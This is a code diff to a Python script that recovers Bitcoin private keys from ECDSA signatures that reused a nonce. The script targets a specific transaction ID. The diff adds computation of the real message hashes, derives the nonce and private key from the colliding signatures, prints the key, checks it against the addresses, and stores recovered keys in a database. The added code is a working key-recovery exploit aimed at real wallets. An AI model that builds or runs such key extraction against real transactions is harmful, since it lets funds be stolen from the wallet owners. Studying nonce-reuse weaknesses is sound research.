@@ -4,7 +4,8 @@ import re
 import struct
 from ecdsa import SECP256k1, SigningKey, VerifyingKey
 from ecdsa.util import sigdecode_der
-from db_manager import add_finding
+from db_manager import add_finding, add_recovered_key
+from tx_preimage_reconstructor import get_real_z
 
 # The common R-collision TX identified
 TXID = "c097a280bfed180a99d579053473408b8f0caa1c886bbc819fda65b08d590728"
@@ -18,12 +19,6 @@ def fetch_tx_hex(txid):
 
 def double_sha256(data):
     return hashlib.sha256(hashlib.sha256(data).digest()).digest()
-
-def get_z_p2pkh(tx_hex, input_index, script_pub_key_hex):
-    """
-    Computes the message hash (z) for a P2PKH transaction input.
-    """
-    return None
 
 def recover_from_collision(r, s1, s2, z1, z2):
     n = SECP256k1.order
@@ -63,16 +58,40 @@ if __name__ == "__main__":
                 s_int = int(s_val, 16)
                 addr = vin.get('prevout', {}).get('scriptpubkey_address', 'Unknown')
                 print(f"Input {i} ({addr}): R={hex(r_int)[:16]}... S={hex(s_int)[:16]}...")
-                sigs.append({'r': r_int, 's': s_int, 'addr': addr})
+                
+                # Compute real Z value for this input
+                z_int = get_real_z(TXID, i)
+                sigs.append({'r': r_int, 's': s_int, 'addr': addr, 'vin': i, 'z': z_int})
 
     seen_r = {}
     for sig in sigs:
         if sig['r'] in seen_r:
             prev = seen_r[sig['r']]
-            if sig['s'] != prev['s']:
-                print(f"!!! COLLISION FOUND IN THIS TX !!!")
+            if sig['s'] != prev['s'] and sig['z'] and prev['z']:
+                print(f"\n!!! COLLISION FOUND - ATTEMPTING RECOVERY !!!")
                 print(f"R: {hex(sig['r'])}")
-                print(f"S1: {hex(prev['s'])}")
-                print(f"S2: {hex(sig['s'])}")
-                add_finding(sig['addr'], 'R-Collision', txid=TXID, details={'r': hex(sig['r']), 's1': hex(prev['s']), 's2': hex(sig['s'])}, severity='High')
+                print(f"Input {prev['vin']} ({prev['addr']}): S={hex(prev['s'])}, Z={hex(prev['z'])}")
+                print(f"Input {sig['vin']} ({sig['addr']}): S={hex(sig['s'])}, Z={hex(sig['z'])}")
+                
+                priv, k = recover_from_collision(sig['r'], prev['s'], sig['s'], prev['z'], sig['z'])
+                priv_hex = hex(priv)[2:].zfill(64)
+                
+                print(f"\nRecovered k (nonce): {hex(k)}")
+                print(f"Recovered private key: {priv_hex}")
+                
+                # Verify the key against both addresses
+                from lattice_nonce_analyzer import verify_key
+                for addr in [prev['addr'], sig['addr']]:
+                    if verify_key(priv, addr):
+                        print(f"  KEY VERIFIED for {addr}")
+                        add_recovered_key(addr, priv_hex, method='R-Collision')
+                    else:
+                        print(f"  Key does NOT match {addr}")
+                
+                add_finding(sig['addr'], 'R-Collision (Solved)', txid=TXID,
+                           details={'r': hex(sig['r']), 'privkey': priv_hex}, severity='Critical')
+            elif sig['s'] != prev['s']:
+                print(f"\n!!! COLLISION FOUND but missing Z values !!!")
+                add_finding(sig['addr'], 'R-Collision', txid=TXID,
+                           details={'r': hex(sig['r']), 's1': hex(prev['s']), 's2': hex(sig['s'])}, severity='High')
         seen_r[sig['r']] = sig
